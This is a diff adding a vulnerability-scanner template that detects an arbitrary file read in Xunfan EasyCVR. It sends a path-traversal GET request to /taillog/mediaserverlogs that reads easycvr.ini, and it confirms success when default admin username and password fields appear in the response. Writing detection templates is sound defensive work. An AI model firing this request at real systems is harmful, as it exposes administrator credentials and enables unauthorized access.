@@ -1,0 +1,25 @@
+id: xunfan-easycvr-taillog-mediaserverlogs-fileread
+
+info:
+  name: 旭帆EasyCVR软件-taillog-mediaserverlogs任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    旭帆EasyCVR软件-taillog-mediaserverlogs任意文件读取
+  tags: xunfan,easycvr,fileread
+  created: 2025/01/06
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /taillog/mediaserverlogs/..%5Ceasycvr.ini
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'[user_default]') &&
+      response.body.bcontains(b'[base_config]') &&
+      response.body.bcontains(b'default_admin_user') &&
+      response.body.bcontains(b'default_admin_password') &&
+      response.body.bcontains(b'default_admin_role_name')
+expression: r0()
